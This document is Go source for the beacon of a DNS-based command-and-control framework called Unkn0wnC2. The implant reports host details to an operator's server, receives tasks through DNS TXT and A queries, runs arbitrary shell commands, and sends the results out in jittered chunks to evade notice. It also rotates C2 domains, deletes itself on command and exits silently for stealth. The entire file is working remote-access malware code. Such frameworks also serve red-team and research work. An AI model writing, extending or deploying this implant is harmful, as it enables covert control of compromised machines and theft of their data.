// Package main implements the Unkn0wnC2 DNS-based Command & Control client beacon.
// This client establishes communication with the C2 server through DNS queries,
// executes commands, and exfiltrates results using encrypted DNS traffic.
package main

import (
	"bytes"
	"context"
	"crypto/md5"
	crand "crypto/rand"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// Beacon represents the DNS beacon client
type Beacon struct {
	client   *DNSClient
	id       string
	hostname string
	username string
	os       string
	arch     string
	name     string
	running  atomic.Bool
	regStage atomic.Int32 // 0=not started, 3=complete (use POLL); 1,2 are intermediate staged steps

	// Operator-defined variables: expanded in commands before execution
	vars   map[string]string
	varsMu sync.RWMutex

	// Task dedup: prevents re-execution when Shadow Mesh delivers the same task via multiple DNS servers
	executedMu       sync.Mutex
	executedTasks    map[string]bool
	executedOrder    []string
	executedMaxSize  int
}

// newBeacon creates a new beacon instance with system information
// including hostname, username, and operating system details.
func newBeacon() (*Beacon, error) {
	cfg := getConfig()
	if cfg.EncryptionKey == "DEVELOPMENT_KEY_CHANGE_ME" {
		return nil, fmt.Errorf("binary was built with development stub config - rebuild via Archon")
	}

	client := newDNSClient()

	// Generate unique beacon ID
	hostname, _ := os.Hostname()
	beaconID := generateBeaconID(hostname)

	// Get system info
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME") // Windows
	}
	if username == "" {
		username = "unknown"
	}

	name := client.config.BuildID
	if name == "" {
		name = client.config.BeaconName
	}

	return &Beacon{
		client:          client,
		id:              beaconID,
		hostname:        hostname,
		username:        username,
		os:              runtime.GOOS,
		arch:            runtime.GOARCH,
		name:            name,
		vars:            make(map[string]string),
		executedTasks:   make(map[string]bool),
		executedMaxSize: 100,
	}, nil
}

func generateBeaconID(hostname string) string {
	entropy := make([]byte, 8)
	if _, err := crand.Read(entropy); err != nil {
		entropy = []byte(fmt.Sprintf("%d%d", time.Now().UnixNano(), os.Getpid()))
	}
	hash := md5.Sum(append([]byte(hostname), entropy...))
	return fmt.Sprintf("%x", hash)[:4]
}

// checkIn sends a beacon check-in to the DNS server.
// Supports staged registration: when enabled, the initial CHK is split into
// 3 smaller queries (S1/S2/S3) across consecutive check-in intervals.
// Uses per-phase malleable config for registration vs poll phases.
func (b *Beacon) checkIn() (string, error) {
	stage := b.regStage.Load()

	// Registration complete — use lightweight POLL with poll-phase config
	if stage >= 3 {
		pollPhase := b.client.config.GetPollPhase()
		pollData := fmt.Sprintf("POLL|%s", b.id)

		if pollPhase.QueryType == "A" {
			// Two-step A-record poll: probe for task signal, then TXT follow-up
			response, err := b.client.sendPhaseCommand(pollData, pollPhase.PhaseConfig)
			if err != nil {
				return "", fmt.Errorf("poll failed: %v", err)
			}

			if response == pollPhase.ARecordTaskIP {
				// Task pending — wait configured delay, then do TXT follow-up
				followUp := pollPhase.TxtFollowUpSecs
				if followUp <= 0 {
					cfg := b.client.config
					spread := cfg.SleepMax - cfg.SleepMin + 1
				if spread <= 0 {
					spread = 1
				}
				followUp = cfg.SleepMin + rand.Intn(spread)
				}
				time.Sleep(time.Duration(followUp) * time.Second)

				// TXT follow-up to retrieve the actual task
				txtPhase := pollPhase.PhaseConfig
				txtPhase.QueryType = "TXT"
				txtResponse, txtErr := b.client.sendPhaseCommand(pollData, txtPhase)
				if txtErr != nil {
					return "", fmt.Errorf("TXT follow-up failed: %v", txtErr)
				}
				if txtResponse == "REREG" {
					b.regStage.Store(0)
					return "", nil
				}
				return txtResponse, nil
			}

			// ACK or unknown IP — no task
			if response == pollPhase.ARecordACKIP || response == "" {
				return "ACK", nil
			}
			return "ACK", nil
		}

		// TXT mode poll (default) — works like before
		response, err := b.client.sendPhaseCommand(pollData, pollPhase.PhaseConfig)
		if err != nil {
			return "", fmt.Errorf("poll failed: %v", err)
		}
		if response == "REREG" {
			b.regStage.Store(0)
		} else {
			return response, nil
		}
		stage = 0
	}

	shortHostname := b.hostname
	if len(shortHostname) > 10 {
		shortHostname = shortHostname[:10]
	}
	shortUsername := b.username
	if len(shortUsername) > 8 {
		shortUsername = shortUsername[:8]
	}
	shortOS := b.os
	if len(shortOS) > 7 {
		shortOS = shortOS[:7]
	}
	shortArch := b.arch
	if len(shortArch) > 6 {
		shortArch = shortArch[:6]
	}

	var checkInData string

	if !b.client.config.StagedRegistration {
		checkInData = fmt.Sprintf("CHK|%s|%s|%s|%s|%s",
			b.id, shortHostname, shortUsername, shortOS, shortArch)
		if b.name != "" {
			checkInData = fmt.Sprintf("%s|%s", checkInData, b.name)
		}
	} else {
		switch stage {
		case 0:
			checkInData = fmt.Sprintf("CHK|%s|S1|%s", b.id, b.name)
		case 1:
			checkInData = fmt.Sprintf("CHK|%s|S2|%s|%s", b.id, shortHostname, shortOS)
		case 2:
			checkInData = fmt.Sprintf("CHK|%s|S3|%s|%s", b.id, shortUsername, shortArch)
		}
	}

	// Registration uses registration-phase config
	regPhase := b.client.config.GetRegistrationPhase()

	if regPhase.QueryType == "A" {
		// A-record registration: send CHK, server ACKs with IP
		response, err := b.client.sendPhaseCommand(checkInData, regPhase)
		if err != nil {
			return "", fmt.Errorf("check-in failed: %v", err)
		}
		_ = response // ACK IP — registration confirmed

		if b.client.config.StagedRegistration {
			b.regStage.Store(stage + 1)
		} else {
			b.regStage.Store(3)
		}
		return "ACK", nil
	}

	// TXT mode registration (default)
	response, err := b.client.sendPhaseCommand(checkInData, regPhase)
	if err != nil {
		return "", fmt.Errorf("check-in failed: %v", err)
	}

	if b.client.config.StagedRegistration {
		b.regStage.Store(stage + 1)
	} else {
		b.regStage.Store(3)
	}

	return response, nil
}

// executeCommand runs a system command and returns the output
// Commands are subject to a 5-minute timeout to prevent hanging
func (b *Beacon) executeCommand(command string) string {
	// Add panic recovery to prevent beacon crash on command execution errors
	defer func() {
		if r := recover(); r != nil {
			// Log panic to stderr for debugging (will be captured in command output if redirected)
			fmt.Fprintf(os.Stderr, "[Beacon] Panic during command execution: %v\n", r)
		}
	}()

	// Check for special commands
	if command == "selfdestruct" || command == "uninstall" {
		return b.selfDestruct()
	}

	if strings.HasPrefix(command, "exfil ") {
		return b.handleExfilCommand(command[6:])
	}

	// Create context with timeout (5 minutes default)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()

	var cmd *exec.Cmd

	// Choose appropriate shell based on OS with fallback for embedded systems
	switch runtime.GOOS {
	case "windows":
		cmd = exec.CommandContext(ctx, "cmd", "/c", command)
	default:
		// Try to find a working shell (important for embedded ARM devices)
		shell := "/bin/sh"
		if _, err := os.Stat("/bin/bash"); err == nil {
			shell = "/bin/bash"
		} else if _, err := os.Stat("/bin/ash"); err == nil {
			// Alpine Linux / busybox (common on embedded systems)
			shell = "/bin/ash"
		}
		cmd = exec.CommandContext(ctx, shell, "-c", command)
	}

	// Capture output with separate stdout/stderr for better error visibility
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	// Execute command
	err := cmd.Run()

	// Combine output
	output := stdout.String()
	if stderr.Len() > 0 {
		if len(output) > 0 {
			output += "\n"
		}
		output += stderr.String()
	}

	// Check for timeout
	if ctx.Err() == context.DeadlineExceeded {
		return fmt.Sprintf("Error: Command timed out after 5 minutes\nPartial output: %s", output)
	}

	if err != nil {
		return fmt.Sprintf("Error: %v\nOutput: %s", err, output)
	}

	// Truncate output if too large (especially important for 32-bit ARM)
	maxOutputSize := 1024 * 1024 // 1MB limit for 64-bit
	if runtime.GOARCH == "arm" || runtime.GOARCH == "386" {
		maxOutputSize = 512 * 1024 // 512KB for 32-bit architectures
	}

	if len(output) > maxOutputSize {
		output = output[:maxOutputSize] + "\n[OUTPUT TRUNCATED - exceeded " +
			fmt.Sprintf("%dKB", maxOutputSize/1024) + " limit]"
	}

	// Return raw result - compression removed to support large chunked exfils
	return output
}

// selfDestruct removes the beacon binary and exits
// This command allows operators to cleanly remove the beacon from compromised systems
func (b *Beacon) selfDestruct() string {
	b.running.Store(false) // Stop the beacon loop

	exePath, err := os.Executable()
	if err != nil {
		return fmt.Sprintf("Self-destruct failed: unable to determine executable path: %v", err)
	}

	// Schedule deletion after exit
	go func() {
		time.Sleep(2 * time.Second)

		var cmd *exec.Cmd
		switch runtime.GOOS {
		case "windows":
			// Use cmd to delete after a delay
			cmd = exec.Command("cmd", "/c", fmt.Sprintf("ping 127.0.0.1 -n 5 >nul & del /f /q \"%s\"", exePath))
		default:
			// Use sh to delete after a delay
			cmd = exec.Command("sh", "-c", fmt.Sprintf("sleep 3 && rm -f '%s'", exePath))
		}

		cmd.Start()
		os.Exit(0)
	}()

	return "Self-destruct initiated. Beacon will terminate and remove itself in 3 seconds."
}

// exfiltrateResult sends command results back via DNS using three-phase protocol:
// 1. RESULT_META - announces incoming result with total size and chunk count
// 2. DATA chunks - sends result data in manageable pieces
// 3. RESULT_COMPLETE - signals all chunks sent successfully
// Uses per-phase DataExfil config for encoding, query type, and format.
func (b *Beacon) exfiltrateResult(result string, taskID string) error {
	exfilPhase := b.client.config.GetDataExfilPhase()

	maxCmd := exfilPhase.MaxPayload
	if maxCmd <= 0 {
		maxCmd = b.client.config.MaxCommandLength
	}
	if maxCmd <= 64 {
		maxCmd = 800
	}

	maxSubLen := exfilPhase.MaxPayload
	if maxSubLen <= 0 {
		maxSubLen = b.client.config.MaxSubdomainLength
	}

	overhead := 63
	if !exfilPhase.Encrypted {
		overhead = 35
	}

	var safeRawChunk int
	if maxSubLen > 0 {
		labelDots := maxSubLen / 63
		encodedBudget := maxSubLen - labelDots
		safeRawChunk = encodedBudget*5/8 - overhead
		if safeRawChunk < 1 {
			safeRawChunk = 1
		}
	} else {
		calcOverhead := 100
		safeRawChunk = (maxCmd - calcOverhead) / 2
		if safeRawChunk < 8 {
			safeRawChunk = 8
		}
	}

	if exfilPhase.PayloadFormat != "" {
		xSlots := countDataSlots(exfilPhase.PayloadFormat)
		formatChunk := xSlots*5/8 - overhead
		if formatChunk >= 1 {
			if safeRawChunk == 0 || formatChunk < safeRawChunk {
				safeRawChunk = formatChunk
			}
		}
	}

	maxDomainLen := 0
	for _, d := range b.client.config.GetDomains() {
		if len(d) > maxDomainLen {
			maxDomainLen = len(d)
		}
	}
	if maxDomainLen == 0 {
		maxDomainLen = 20
	}
	subBudget := 253 - 1 - maxDomainLen
	fqdnLabelDots := subBudget / 63
	fqdnEncoded := subBudget - fqdnLabelDots
	fqdnCap := fqdnEncoded*5/8 - overhead
	if fqdnCap < 8 {
		fqdnCap = 8
	}
	if safeRawChunk > fqdnCap {
		safeRawChunk = fqdnCap
	}

	totalChunks := (len(result) + safeRawChunk - 1) / safeRawChunk
	if totalChunks == 0 {
		totalChunks = 1
	}

	metaData := fmt.Sprintf("RESULT_META|%s|%s|%d|%d", b.id, taskID, len(result), totalChunks)

	var err error
	metaSent := false
	for metaAttempt := 1; metaAttempt <= 3; metaAttempt++ {
		_, err = b.client.sendPhaseCommand(metaData, exfilPhase)
		if err == nil {
			metaSent = true
			break
		}
		if metaAttempt < 3 {
			time.Sleep(time.Duration(metaAttempt) * time.Second)
		}
	}

	if !metaSent {
		return fmt.Errorf("failed to send result metadata after 3 attempts: %v", err)
	}

	jitterMin := b.client.config.ExfilJitterMinMs
	jitterMax := b.client.config.ExfilJitterMaxMs
	chunksPerBurst := b.client.config.ExfilChunksPerBurst
	burstPause := b.client.config.ExfilBurstPauseMs

	if jitterMin <= 0 {
		jitterMin = 1000
	}
	if jitterMax < jitterMin {
		jitterMax = jitterMin + 1000
	}
	if chunksPerBurst <= 0 {
		chunksPerBurst = 10
	}
	if burstPause <= 0 {
		burstPause = 5000
	}

	failedChunks := 0
	for i := 0; i < totalChunks; i++ {
		start := i * safeRawChunk
		end := start + safeRawChunk
		if end > len(result) {
			end = len(result)
		}

		chunk := result[start:end]
		chunkIndex := i + 1
		chunkData := fmt.Sprintf("DATA|%s|%s|%d|%d|%s", b.id, taskID, chunkIndex, totalChunks, chunk)

		chunkSent := false
		for chunkAttempt := 1; chunkAttempt <= 2; chunkAttempt++ {
			_, err := b.client.sendPhaseCommand(chunkData, exfilPhase)
			if err == nil {
				chunkSent = true
				break
			}
			if chunkAttempt < 2 {
				time.Sleep(500 * time.Millisecond)
			}
		}

		if !chunkSent {
			failedChunks++
		}

		if (i+1)%chunksPerBurst == 0 && i+1 < totalChunks {
			jitterDelay := jitterMin + rand.Intn(jitterMax-jitterMin+1)
			totalDelay := time.Duration(jitterDelay+burstPause) * time.Millisecond
			time.Sleep(totalDelay)
		} else if i+1 < totalChunks {
			time.Sleep(time.Duration(100+rand.Intn(400)) * time.Millisecond)
		}
	}

	if failedChunks > 0 {
		return fmt.Errorf("failed to send %d/%d chunks", failedChunks, totalChunks)
	}

	completeData := fmt.Sprintf("RESULT_COMPLETE|%s|%s|%d", b.id, taskID, totalChunks)
	for attempt := 1; attempt <= 3; attempt++ {
		_, err = b.client.sendPhaseCommand(completeData, exfilPhase)
		if err == nil {
			return nil
		}
		if attempt < 3 {
			time.Sleep(time.Duration(attempt) * time.Second)
		}
	}

	return fmt.Errorf("failed to send completion message after 3 attempts: %v", err)
}

// parseTask parses a task from the DNS server response.
// Returns chunkInfo like "1/3" for chunked tasks, empty for single-shot tasks.
func (b *Beacon) parseTask(response string) (taskID, command string, isTask bool, chunkInfo string) {
	parts := strings.SplitN(response, "|", 4)

	if len(parts) >= 4 && parts[0] == "TASKC" {
		return parts[1], parts[3], true, parts[2]
	}

	if len(parts) >= 3 && parts[0] == "TASK" {
		return parts[1], strings.Join(parts[2:], "|"), true, ""
	}

	return "", "", false, ""
}

// requestRemainingChunks fetches chunks 2..N of a multi-chunk task via TASKGET queries
func (b *Beacon) requestRemainingChunks(taskID string, totalChunks int, firstChunk string) (string, error) {
	chunks := make([]string, totalChunks)
	chunks[0] = firstChunk

	pollPhase := b.client.config.GetPollPhase()
	// TASKGET always needs TXT — A-record responses can't carry command data
	txtPhase := pollPhase.PhaseConfig
	txtPhase.QueryType = "TXT"

	for i := 2; i <= totalChunks; i++ {
		var chunkData string
		var err error

		for attempt := 1; attempt <= 3; attempt++ {
			jitter := time.Duration(1+rand.Intn(3)) * time.Second
			time.Sleep(jitter)

			query := fmt.Sprintf("TASKGET|%s|%s|%d", b.id, taskID, i)
			resp, qErr := b.client.sendPhaseCommand(query, txtPhase)
			if qErr != nil {
				err = qErr
				continue
			}

			respParts := strings.SplitN(resp, "|", 4)
			if len(respParts) >= 4 && respParts[0] == "TASKC" && respParts[1] == taskID {
				chunkData = respParts[3]
				err = nil
				break
			}
			err = fmt.Errorf("unexpected response for chunk %d", i)
		}

		if err != nil {
			return "", fmt.Errorf("failed to get chunk %d/%d: %v", i, totalChunks, err)
		}
		chunks[i-1] = chunkData
	}

	var full strings.Builder
	for _, c := range chunks {
		full.WriteString(c)
	}
	return full.String(), nil
}

// handleUpdateDomains updates the beacon's DNS domain list
func (b *Beacon) handleUpdateDomains(domainsJSON string) {
	// Parse JSON array of domains
	domainsJSON = strings.TrimSpace(domainsJSON)
	if !strings.HasPrefix(domainsJSON, "[") || !strings.HasSuffix(domainsJSON, "]") {
		return // Invalid format
	}

	// Simple JSON array parser (domains should be strings)
	domainsJSON = strings.TrimPrefix(domainsJSON, "[")
	domainsJSON = strings.TrimSuffix(domainsJSON, "]")

	var newDomains []string
	for _, domain := range strings.Split(domainsJSON, ",") {
		domain = strings.Trim(strings.TrimSpace(domain), "\"")
		if domain != "" {
			newDomains = append(newDomains, domain)
		}
	}

	if len(newDomains) > 0 {
		// Update client domains without resetting domain index
		// This ensures Shadow Mesh rotation continues smoothly
		b.client.mutex.Lock()
		oldDomains := b.client.config.DNSDomains
		b.client.config.DNSDomains = newDomains
		// DON'T reset domainIndex - let Shadow Mesh selection continue
		// The selectDomain() function will handle the new domain list correctly
		// Reset failed domain tracking to give new servers a chance
		b.client.failedDomains = make(map[string]time.Time)
		b.client.mutex.Unlock()
		_ = oldDomains // Prevent unused variable warning
	}
}

// expandVars replaces $KEY and ${KEY} references with stored variable values.
// Unknown variables pass through unchanged so the shell can expand its own env vars.
func (b *Beacon) expandVars(input string) string {
	b.varsMu.RLock()
	defer b.varsMu.RUnlock()
	if len(b.vars) == 0 {
		return input
	}
	return os.Expand(input, func(key string) string {
		if val, ok := b.vars[key]; ok {
			return val
		}
		return "${" + key + "}"
	})
}

func (b *Beacon) handleSetVar(args string) string {
	eqIdx := strings.Index(args, "=")
	if eqIdx <= 0 {
		return "Usage: setvar KEY=VALUE"
	}
	key := strings.TrimSpace(args[:eqIdx])
	value := b.expandVars(args[eqIdx+1:])
	if key == "" {
		return "Usage: setvar KEY=VALUE"
	}
	b.varsMu.Lock()
	b.vars[key] = value
	b.varsMu.Unlock()
	return fmt.Sprintf("$%s=%s", key, value)
}

func (b *Beacon) handleUnsetVar(args string) string {
	key := strings.TrimSpace(args)
	if key == "" {
		return "Usage: unsetvar KEY"
	}
	b.varsMu.Lock()
	_, existed := b.vars[key]
	delete(b.vars, key)
	b.varsMu.Unlock()
	if !existed {
		return fmt.Sprintf("Variable $%s not set", key)
	}
	return fmt.Sprintf("Unset $%s", key)
}

func (b *Beacon) handleListVars() string {
	b.varsMu.RLock()
	defer b.varsMu.RUnlock()
	if len(b.vars) == 0 {
		return "No variables set"
	}
	keys := make([]string, 0, len(b.vars))
	for k := range b.vars {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	var sb strings.Builder
	for _, k := range keys {
		fmt.Fprintf(&sb, "$%s=%s\n", k, b.vars[k])
	}
	return strings.TrimRight(sb.String(), "\n")
}

// sendResult sends a task result back to the C2
func (b *Beacon) sendResult(taskID, result string) error {
	return b.exfiltrateResult(result, taskID) // Fix: parameters were reversed
}

// runBeacon starts the beacon loop
func (b *Beacon) runBeacon() {
	b.running.Store(true)

	// Main beacon loop with randomized sleep intervals
	sleepMin := b.client.config.SleepMin
	sleepMax := b.client.config.SleepMax

	if sleepMin <= 0 {
		sleepMin = 5 // Default minimum 5 seconds
	}
	if sleepMax <= sleepMin {
		sleepMax = sleepMin + 10 // Default maximum
	}

	// CRITICAL: Beacon NEVER exits, even if all C2 servers are down
	// This allows operators to tear down and rebuild infrastructure
	// while beacons continue to persist and automatically reconnect
	for b.running.Load() {
		// Randomize sleep interval between min and max for OPSEC
		sleepDuration := time.Duration(sleepMin+rand.Intn(sleepMax-sleepMin+1)) * time.Second
		time.Sleep(sleepDuration)

		// Send check-in - if it fails, beacon continues trying
		response, err := b.checkIn()
		if err != nil {
			continue
		}

		// Check for DOMAINS response (sent on first check-in)
		if strings.HasPrefix(response, "DOMAINS|") {
			domainList := response[8:] // Skip "DOMAINS|"
			parts := strings.Split(domainList, ",")
			var incoming []string
			seen := make(map[string]bool)
			for _, domain := range parts {
				domain = strings.TrimSpace(domain)
				if domain == "" || seen[domain] {
					continue
				}
				incoming = append(incoming, domain)
				seen[domain] = true
			}

			b.client.mutex.Lock()
			existing := b.client.config.DNSDomains
			merged := make([]string, 0, len(incoming)+len(existing))
			seen = make(map[string]bool)
			for _, domain := range incoming {
				if !seen[domain] {
					merged = append(merged, domain)
					seen[domain] = true
				}
			}
			for _, domain := range existing {
				if !seen[domain] {
					merged = append(merged, domain)
					seen[domain] = true
				}
			}
			if len(merged) == 0 && len(existing) > 0 {
				merged = existing
			}
			if len(merged) > 0 {
				b.client.config.DNSDomains = merged
				if len(merged) > 0 {
					b.client.domainIndex %= len(merged)
				}
				last := b.client.lastDomain
				if last != "" {
					stillPresent := false
					for _, domain := range merged {
						if domain == last {
							stillPresent = true
							break
						}
					}
					if !stillPresent {
						b.client.lastDomain = ""
					}
				}
			}
			b.client.mutex.Unlock()

			// Continue to next check-in cycle
			continue
		}

		// Check if server has a task for us
		taskID, command, isTask, chunkInfo := b.parseTask(response)
		if isTask {
			// Handle chunked task delivery
			if chunkInfo != "" {
				slashIdx := strings.Index(chunkInfo, "/")
				if slashIdx > 0 {
					totalChunks, _ := strconv.Atoi(chunkInfo[slashIdx+1:])
					if totalChunks > 1 {
						fullCmd, err := b.requestRemainingChunks(taskID, totalChunks, command)
						if err != nil {
							continue
						}
						command = fullCmd
					}
				}
			}

			// Dedup: skip if we've already executed this task (Shadow Mesh race window)
			// Mark as executed BEFORE execution to close the TOCTOU race —
			// if another DNS server delivers the same task concurrently, it will be skipped
			b.executedMu.Lock()
			if b.executedTasks[taskID] {
				b.executedMu.Unlock()
				continue
			}
			b.executedTasks[taskID] = true
			b.executedOrder = append(b.executedOrder, taskID)
			for len(b.executedOrder) > b.executedMaxSize {
				delete(b.executedTasks, b.executedOrder[0])
				b.executedOrder = b.executedOrder[1:]
			}
			b.executedMu.Unlock()

			// Wrap task execution in panic recovery to prevent beacon crash
			func() {
				defer func() {
					if r := recover(); r != nil {
						errorMsg := fmt.Sprintf("Task execution panic: %v", r)
						// Try to report the error back to C2
						b.exfiltrateResult(errorMsg, taskID)
					}
				}()

				// Handle variable management commands
				if strings.HasPrefix(command, "setvar ") {
					result := b.handleSetVar(command[7:])
					b.exfiltrateResult(result, taskID)
					return
				}
				if command == "listvars" {
					result := b.handleListVars()
					b.exfiltrateResult(result, taskID)
					return
				}
				if strings.HasPrefix(command, "unsetvar ") {
					result := b.handleUnsetVar(command[9:])
					b.exfiltrateResult(result, taskID)
					return
				}

				// Expand variables before execution
				command = b.expandVars(command)

				// Check for special commands
				if strings.HasPrefix(command, "update_domains:") {
					// Special system command to update DNS domain list
					domainsJSON := command[15:] // Skip "update_domains:" prefix

					// Update the domain list
					b.handleUpdateDomains(domainsJSON)

					// NOTE: We don't send a result for update_domains tasks
					// The beacon will naturally check in to the new DNS servers in the next cycle
					// Sending a RESULT would cause the new DNS server to receive it immediately,
					// which looks like a task result instead of a check-in

					// Continue to next check-in cycle immediately
					// The sleep will happen at the top of the loop, then check-in will use the new domain list
					return
				}

				// Execute regular command
				result := b.executeCommand(command)

				// Exfiltrate the result with retries
				maxRetries := 3
				for attempt := 1; attempt <= maxRetries; attempt++ {
					err := b.exfiltrateResult(result, taskID)
					if err == nil {
						break // Success
					}
					// Failed - retry with exponential backoff
					if attempt < maxRetries {
						backoff := time.Duration(attempt*2) * time.Second
						time.Sleep(backoff)
					}
				}
			}()

			// Task already marked as executed before execution (pre-execution dedup above)

			// If update_domains was processed, the closure returned early
			// Continue to next cycle
			if strings.HasPrefix(command, "update_domains:") {
				continue
			}
		}
	}
}

// main function - entry point
func main() {
	// Random number generator auto-seeded in Go 1.20+
	// No explicit seed needed for randomized sleep intervals

	// Create beacon with embedded configuration
	beacon, err := newBeacon()
	if err != nil {
		os.Exit(1) // Silent exit for stealth
	}

	// Handle Ctrl+C gracefully
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		beacon.running.Store(false)
		time.Sleep(1 * time.Second)
		os.Exit(0)
	}()

	// Start the beacon
	beacon.runBeacon()
}
